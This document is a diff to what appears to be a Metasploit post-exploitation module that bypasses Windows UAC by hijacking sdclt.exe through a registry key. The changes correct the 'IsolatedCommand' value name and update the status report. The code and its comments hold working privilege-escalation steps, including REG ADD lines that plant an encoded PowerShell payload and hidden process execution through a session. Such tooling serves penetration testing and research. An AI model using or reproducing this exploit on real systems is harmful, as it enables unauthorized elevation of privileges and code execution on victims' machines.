@@ -181,7 +181,7 @@ end
   vul_serve = "sdclt.exe" # vulnerable soft to be hijacked
   exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell shellcode base64)
   uac_level = "ConsentPromptBehaviorAdmin" # uac level registry key
-  vul_value = "isolatedCommand" # vulnerable registry value to create
+  vul_value = "IsolatedCommand" # vulnerable registry value to create
   comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # cmd.exe %comspec% path
   regi_hive = "REG ADD HKCU\\Software\\Classes\\exefile\\shell\\runas\\command" # registry hive key to be hijacked
   psh_lpath = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe" # powershell.exe %comspec% path
@@ -253,8 +253,8 @@ end
         end
 
  # Execute process hijacking in registry (cmd.exe OR powershell.exe) ..
- # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /v isolatedCommand /t REG_SZ /d "powershell.exe -nop -enc aDfSjRnGlsdD==" /f
- # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /v isolatedCommand /t REG_SZ /d "%windir%\System32\cmd.exe /c start notepad.exe" /f
+ # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /v IsolatedCommand /t REG_SZ /d "powershell.exe -nop -enc aDfSjRnGlsdD==" /f
+ # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /v IsolatedCommand /t REG_SZ /d "%windir%\System32\cmd.exe /c start notepad.exe" /f
  print_good(" exec => Hijacking process to gain code execution ..")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit 'enigma0x3' :D
@@ -287,7 +287,7 @@ def ls_stage2
   r=''
   session = client
   vul_serve = "sdclt.exe" # vulnerable soft to be hijacked
-  vul_value = "isolatedCommand" # vulnerable reg value to create
+  vul_value = "IsolatedCommand" # vulnerable reg value to create
   chec_hive = "HKCU\\Software\\Classes\\exefile\\shell\\runas\\command" # registry hive key to be hijacked
   reg_clean = "REG DELETE HKCU\\Software\\Classes\\exefile /f" # registry hive to be clean
   # check for proper config settings enter
@@ -309,7 +309,7 @@ def ls_stage2
       Rex::sleep(1.0)
     else
        # registry hive key not found, aborting module execution.
-       print_warning("Hive key: HKCU\\Software\\Classes\\exefile\\shell\\runas\\command isolatedCommand")
+       print_warning("Hive key: HKCU\\Software\\Classes\\exefile\\shell\\runas\\command IsolatedCommand")
        print_error("[ABORT]: module cant find the registry hive key needed ..")
        print_line("")
        Rex::sleep(1.0)
@@ -355,7 +355,7 @@ def ls_stage3
   oscheck = client.fs.file.expand_path("%OS%")
   vuln_soft = "sdclt.exe" # vulnerable soft to be hijacked
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
-  vul_value = "isolatedCommand" # vulnerable reg value to create
+  vul_value = "IsolatedCommand" # vulnerable reg value to create
   vuln_key = "HKCU\\Software\\Classes\\exefile\\shell\\runas\\command" # vuln hijack key
   uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
   # check for proper config settings enter
@@ -373,8 +373,8 @@ def ls_stage3
     Rex::sleep(2.0)
     # check target registry hive/key settings (hijacking hive/key)
     if registry_getvaldata("#{vuln_key}","#{vul_value}")
-      vuln_stats = "#{vuln_key}\\#{vul_value}"
-      report_tw = "REGISTRY HIJACK KEY FOUND (Active)"
+      vuln_stats = "#{vuln_key}"
+      report_tw = "REGISTRY HIJACK KEY FOUND (UAC Bypass Active)"
     elsif registry_enumkeys("HKCU\\Software\\Classes\\exefile")
       vuln_stats = "HKCU\\Software\\Classes\\exefile"
       report_tw = "REGISTRY HIVE FOUND (Vulnerable)"
@@ -408,6 +408,7 @@ def ls_stage3
     print_line("    TARGET_OS   : #{oscheck}")
     print_line("    UAC_LEVEL   : #{report_level}")
     print_line("")
+    print_line("    HIJACK_KEY  : #{vul_value}")
     print_line("    HIJACK_HIVE : #{vuln_stats}")
     print_line("    KEY_INFO    : #{report_tw}")
     print_line("")
